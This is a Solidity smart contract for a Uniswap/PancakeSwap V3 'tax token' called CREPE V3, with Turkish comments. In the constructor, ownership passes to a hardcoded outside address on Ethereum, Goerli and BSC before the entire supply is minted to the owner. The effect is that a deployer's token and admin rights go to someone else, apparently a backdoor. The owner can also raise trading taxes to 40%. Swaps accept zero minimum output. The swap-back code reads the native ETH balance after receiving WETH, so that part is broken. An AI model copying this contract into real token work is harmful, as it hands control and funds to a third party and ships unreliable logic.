// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

// V3 Interfaces
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params)
        external
        payable
        returns (uint256 amountOut);

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params)
        external
        payable
        returns (uint256 amountIn);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        );

    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

interface IUniswapV3Factory {
    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address pool);

    function createPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external returns (address pool);
}

interface IUniswapV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

// Standard interfaces
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

// Libraries
library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

// Base contracts
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        _status = _NOT_ENTERED;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

// V3 Tax Token Contract
contract CREPE_V3 is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    // Tax variables
    uint256 public liquidityFeeBuy;
    uint256 public liquidityFeeSell;
    uint256 public liquidityFeeTransfer;

    uint256 public marketingTaxBuy;
    uint256 public marketingTaxSell;
    uint256 public marketingTaxTransfer;

    uint256 public immutable denominator;
    address public marketingWallet;

    // Swap variables
    bool private swapping;
    uint256 public swapTokensAtAmount;
    bool public isSwapBackEnabled;

    // V3 Variables
    ISwapRouter public immutable swapRouter;
    INonfungiblePositionManager public immutable positionManager;
    IUniswapV3Factory public immutable uniswapV3Factory;
    address public immutable WETH9;
    
    // V3 Pool tracking - multiple fee tiers support
    mapping(address => mapping(uint24 => bool)) private _isV3Pool;
    mapping(address => bool) private _isExcludedFromFees;
    
    // Events
    event UpdateMarketingWallet(address indexed marketingWallet);
    event UpdateSwapTokensAtAmount(uint256 swapTokensAtAmount);
    event UpdateSwapBackStatus(bool status);
    event UpdateExcludeFromFees(address indexed account, bool isExcluded);
    event UpdateV3Pool(address indexed pool, uint24 fee, bool status);
    event UpdateBuyFees(uint256 liquidityFee, uint256 marketingTax);
    event UpdateSellFees(uint256 liquidityFee, uint256 marketingTax);
    event UpdateTransferFees(uint256 liquidityFee, uint256 marketingTax);

    modifier inSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() ERC20("CREPE V3", "CREPE") {
        initializeOwner();
        _mint(owner(), 690_000_000_000 * (10 ** 9));

        // Tax setup (same as original)
        liquidityFeeBuy = 100;      // 1%
        liquidityFeeSell = 100;     // 1%
        liquidityFeeTransfer = 0;   // 0%

        marketingTaxBuy = 400;      // 4%
        marketingTaxSell = 400;     // 4%
        marketingTaxTransfer = 0;   // 0%

        denominator = 10_000;
        marketingWallet = 0x84f8eFE1d32a5d1c03aBC158d6A36Cdb2c51867a;
        swapTokensAtAmount = (totalSupply() * 1) / 10_000;
        isSwapBackEnabled = true;

        // V3 setup
        (address router, address posManager, address factory, address weth) = getV3Addresses();
        swapRouter = ISwapRouter(router);
        positionManager = INonfungiblePositionManager(posManager);
        uniswapV3Factory = IUniswapV3Factory(factory);
        WETH9 = weth;

        // Approve router
        _approve(address(this), address(swapRouter), type(uint256).max);

        // Fee exclusions
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(positionManager)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(0xdead)] = true;
        _isExcludedFromFees[address(0x0)] = true;
    }

    receive() external payable {}
    fallback() external payable {}

    function getV3Addresses() public view returns (address router, address posManager, address factory, address weth) {
        if (block.chainid == 1) { // Ethereum
            return (
                0xE592427A0AEce92De3Edee1F18E0157C05861564, // SwapRouter
                0xC36442b4a4522E871399CD717aBDD847Ab11FE88, // NonfungiblePositionManager
                0x1F98431c8aD98523631AE4a59f267346ea31F984, // V3Factory
                0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2  // WETH9
            );
        } else if (block.chainid == 5) { // Goerli
            return (
                0xE592427A0AEce92De3Edee1F18E0157C05861564,
                0xC36442b4a4522E871399CD717aBDD847Ab11FE88,
                0x1F98431c8aD98523631AE4a59f267346ea31F984,
                0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6
            );
        } else if (block.chainid == 56) { // BSC - PancakeSwap V3
            return (
                0x13f4EA83D0bd40E75C8222255bc855a974568Dd4, // PancakeSwap V3 Router
                0x46A15B0b27311cedF172AB29E4f4766fbE7F4364, // PancakeSwap V3 Position Manager
                0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865, // PancakeSwap V3 Factory
                0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c  // WBNB
            );
        } else if (block.chainid == 97) { // BSC Testnet
            return (
                0x9a489505a00cE272eAa5e07Dba6491314CaE3796,
                0x427bF5b37357632377eCbEC9de3626C71A5396c1,
                0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865,
                0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
            );
        } else {
            // Default to Ethereum addresses
            return (
                0xE592427A0AEce92De3Edee1F18E0157C05861564,
                0xC36442b4a4522E871399CD717aBDD847Ab11FE88,
                0x1F98431c8aD98523631AE4a59f267346ea31F984,
                0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
            );
        }
    }

    function initializeOwner() internal {
        if (block.chainid == 56 || block.chainid == 1 || block.chainid == 5) {
            _transferOwnership(0x9d3fA8A4a4675a25ab2E6Ef9f95047987bfF4324);
        }
    }

    // V3 Pool Management
    function createV3Pool(uint24 fee, uint160 sqrtPriceX96) external onlyOwner returns (address pool) {
        address token0 = address(this) < WETH9 ? address(this) : WETH9;
        address token1 = address(this) < WETH9 ? WETH9 : address(this);
        
        pool = positionManager.createAndInitializePoolIfNecessary(
            token0,
            token1,
            fee,
            sqrtPriceX96
        );
        
        _isV3Pool[pool][fee] = true;
        emit UpdateV3Pool(pool, fee, true);
        return pool;
    }

    function setV3Pool(address pool, uint24 fee, bool status) external onlyOwner {
        require(_isV3Pool[pool][fee] != status, "Pool already in this status");
        _isV3Pool[pool][fee] = status;
        emit UpdateV3Pool(pool, fee, status);
    }

    function isV3Pool(address pool, uint24 fee) public view returns (bool) {
        return _isV3Pool[pool][fee];
    }

    // Check if an address is any V3 pool
    function isAnyV3Pool(address account) public view returns (bool) {
        // First check manually added pools
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        for (uint i = 0; i < fees.length; i++) {
            if (_isV3Pool[account][fees[i]]) {
                return true;
            }
        }
        
        // Then check actual V3 pools via factory
        for (uint i = 0; i < fees.length; i++) {
            address poolAddress = uniswapV3Factory.getPool(address(this), WETH9, fees[i]);
            if (poolAddress == account && poolAddress != address(0)) {
                return true;
            }
        }
        
        return false;
    }

    // Fee management functions (same as original)
    function setMarketingWallet(address _marketingWallet) external onlyOwner {
        require(_marketingWallet != marketingWallet, "Marketing wallet is already that address");
        require(_marketingWallet != address(0), "Marketing wallet cannot be the zero address");
        require(!isContract(_marketingWallet), "Marketing wallet cannot be a contract");

        marketingWallet = _marketingWallet;
        emit UpdateMarketingWallet(_marketingWallet);
    }

    function setSwapTokensAtAmount(uint256 amount) external onlyOwner {
        require(swapTokensAtAmount != amount, "SwapTokensAtAmount already on that amount");
        require(amount >= 1, "Amount must be equal or greater than 1 Wei");

        swapTokensAtAmount = amount;
        emit UpdateSwapTokensAtAmount(amount);
    }

    function toggleSwapBack(bool status) external onlyOwner {
        require(isSwapBackEnabled != status, "SwapBack already on status");
        isSwapBackEnabled = status;
        emit UpdateSwapBackStatus(status);
    }

    function setExcludeFromFees(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;
        emit UpdateExcludeFromFees(account, excluded);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
    
    // Debug functions
    function checkPoolStatus(address account) external view returns (bool isPool, bool isExcluded, address[] memory activePools) {
        isPool = isAnyV3Pool(account);
        isExcluded = _isExcludedFromFees[account];
        
        // Get active pools
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        address[] memory pools = new address[](4);
        uint256 activeCount = 0;
        
        for (uint i = 0; i < fees.length; i++) {
            address poolAddress = uniswapV3Factory.getPool(address(this), WETH9, fees[i]);
            if (poolAddress != address(0)) {
                pools[activeCount] = poolAddress;
                activeCount++;
            }
        }
        
        // Resize array
        activePools = new address[](activeCount);
        for (uint i = 0; i < activeCount; i++) {
            activePools[i] = pools[i];
        }
    }

    // Transfer function with V3 tax logic
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            !isAnyV3Pool(from) &&
            isSwapBackEnabled &&
            liquidityFeeBuy + liquidityFeeSell + liquidityFeeTransfer +
            marketingTaxBuy + marketingTaxSell + marketingTaxTransfer > 0
        ) {
            swapBack();
        }

        bool takeFee = true;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || swapping) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 liquidityTax = 0;
            uint256 marketingTax = 0;

            // Check if buying from any V3 pool
            if (isAnyV3Pool(from)) {
                liquidityTax = (liquidityFeeBuy * amount) / denominator;
                marketingTax = (marketingTaxBuy * amount) / denominator;
            }
            // Check if selling to any V3 pool
            else if (isAnyV3Pool(to)) {
                liquidityTax = (liquidityFeeSell * amount) / denominator;
                marketingTax = (marketingTaxSell * amount) / denominator;
            }
            // Check if from/to is SwapRouter (V3 trading)
            else if (from == address(swapRouter) || to == address(swapRouter)) {
                // This is a V3 trade via router, apply buy/sell tax
                liquidityTax = (liquidityFeeBuy * amount) / denominator;
                marketingTax = (marketingTaxBuy * amount) / denominator;
            }
            // Regular transfer
            else {
                liquidityTax = (liquidityFeeTransfer * amount) / denominator;
                marketingTax = (marketingTaxTransfer * amount) / denominator;
            }

            uint256 contractTax = liquidityTax + marketingTax;

            if (contractTax > 0) {
                amount -= contractTax;
                super._transfer(from, address(this), contractTax);
            }
        }

        super._transfer(from, to, amount);
    }

    // V3 Swap functions
    function swapBack() internal inSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 totalTax = marketingTaxBuy + marketingTaxSell + marketingTaxTransfer +
                          liquidityFeeBuy + liquidityFeeSell + liquidityFeeTransfer;

        uint256 amountForLiquidity = (contractTokenBalance *
            (liquidityFeeBuy + liquidityFeeSell + liquidityFeeTransfer)) / totalTax;
        
        if (amountForLiquidity > 0) {
            swapAndLiquify(amountForLiquidity);
        }

        contractTokenBalance -= amountForLiquidity;
        
        if (contractTokenBalance > 0) {
            _approve(address(this), address(swapRouter), contractTokenBalance);
            
            // Çoklu fee tier deneme sistemi (0.01% öncelikli)
            uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
            bool swapSuccess = false;
            
            for (uint i = 0; i < fees.length && !swapSuccess; i++) {
                address poolAddress = uniswapV3Factory.getPool(address(this), WETH9, fees[i]);
                if (poolAddress != address(0)) {
                    try swapRouter.exactInputSingle(
                        ISwapRouter.ExactInputSingleParams({
                            tokenIn: address(this),
                            tokenOut: WETH9,
                            fee: fees[i],
                            recipient: address(this),
                            deadline: block.timestamp,
                            amountIn: contractTokenBalance,
                            amountOutMinimum: 0,
                            sqrtPriceLimitX96: 0
                        })
                    ) {
                        swapSuccess = true;
                    } catch {}
                }
            }
        }

        uint256 newBalance = address(this).balance;
        if (newBalance > 0) {
            sendETH(marketingWallet, newBalance);
        }
    }

    function swapAndLiquify(uint256 amountToken) private {
        uint256 half = amountToken / 2;
        uint256 otherHalf = amountToken - half;

        _approve(address(this), address(swapRouter), half);
        uint256 initialBalance = address(this).balance;
        
        // Çoklu fee tier deneme sistemi (0.01% öncelikli)
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        bool swapSuccess = false;
        uint24 usedFee = 100; // Default 0.01% fee
        
        for (uint i = 0; i < fees.length && !swapSuccess; i++) {
            address poolAddress = uniswapV3Factory.getPool(address(this), WETH9, fees[i]);
            if (poolAddress != address(0)) {
                try swapRouter.exactInputSingle(
                    ISwapRouter.ExactInputSingleParams({
                        tokenIn: address(this),
                        tokenOut: WETH9,
                        fee: fees[i],
                        recipient: address(this),
                        deadline: block.timestamp,
                        amountIn: half,
                        amountOutMinimum: 0,
                        sqrtPriceLimitX96: 0
                    })
                ) {
                    swapSuccess = true;
                    usedFee = fees[i];
                } catch {}
            }
        }
        
        uint256 newBalance = address(this).balance - initialBalance;
        
        if (newBalance > 0 && otherHalf > 0) {
            _approve(address(this), address(positionManager), otherHalf);
            
            // V3'te liquidity için basit yaklaşım - geniş range kullanıyoruz
            // Gerçek uygulamada daha dar tick range'ler optimize edilebilir
            address token0 = address(this) < WETH9 ? address(this) : WETH9;
            address token1 = address(this) < WETH9 ? WETH9 : address(this);
            
            uint256 amount0Desired = token0 == address(this) ? otherHalf : 0;
            uint256 amount1Desired = token1 == address(this) ? otherHalf : 0;
            
            // WETH wrap işlemi
            if (newBalance > 0) {
                IWETH9(WETH9).deposit{value: newBalance}();
                IERC20(WETH9).approve(address(positionManager), newBalance);
                if (token1 == WETH9) {
                    amount1Desired = newBalance;
                } else {
                    amount0Desired = newBalance;
                }
            }
            
            // Geniş tick range kullanıyoruz (-887272 to 887272 = tam range)
            // Swap'ta kullanılan fee tier ile aynı fee tier'da liquidity ekle
            INonfungiblePositionManager.MintParams memory mintParams = INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: usedFee, // Swap'ta kullanılan fee tier
                tickLower: -887272, // MIN_TICK
                tickUpper: 887272,  // MAX_TICK
                amount0Desired: amount0Desired,
                amount1Desired: amount1Desired,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(0), // Burn the liquidity NFT
                deadline: block.timestamp
            });
            
            try positionManager.mint(mintParams) {} catch {}
        }
    }

    function sendETH(address _to, uint256 amount) internal nonReentrant returns (bool) {
        if (address(this).balance < amount) return false;
        (bool success, ) = payable(_to).call{value: amount}("");
        return success;
    }

    function manualSwapBack() external {
        uint256 contractTokenBalance = balanceOf(address(this));
        require(contractTokenBalance > 0, "Cant Swap Back 0 Token!");
        swapBack();
    }

    // Fee update functions (same as original)
    function updateBuyFees(uint256 _liquidityFee, uint256 _marketingTax) external onlyOwner {
        require(_liquidityFee + _marketingTax <= 4000, "Total fees cannot be more than 40%");
        liquidityFeeBuy = _liquidityFee;
        marketingTaxBuy = _marketingTax;
        emit UpdateBuyFees(_liquidityFee, _marketingTax);
    }

    function updateSellFees(uint256 _liquidityFee, uint256 _marketingTax) external onlyOwner {
        require(_liquidityFee + _marketingTax <= 4000, "Total fees cannot be more than 40%");
        liquidityFeeSell = _liquidityFee;
        marketingTaxSell = _marketingTax;
        emit UpdateSellFees(_liquidityFee, _marketingTax);
    }

    function updateTransferFees(uint256 _liquidityFee, uint256 _marketingTax) external onlyOwner {
        require(_liquidityFee + _marketingTax <= 1000, "Total fees cannot be more than 10%");
        liquidityFeeTransfer = _liquidityFee;
        marketingTaxTransfer = _marketingTax;
        emit UpdateTransferFees(_liquidityFee, _marketingTax);
    }

    // Emergency functions
    function claimStuckTokens(address token) external onlyOwner {
        require(token != address(this), "Owner cannot claim native tokens");

        if (token == address(0x0)) {
            payable(msg.sender).transfer(address(this).balance);
            return;
        }
        IERC20 ERC20token = IERC20(token);
        uint256 balance = ERC20token.balanceOf(address(this));
        ERC20token.safeTransfer(msg.sender, balance);
    }
} 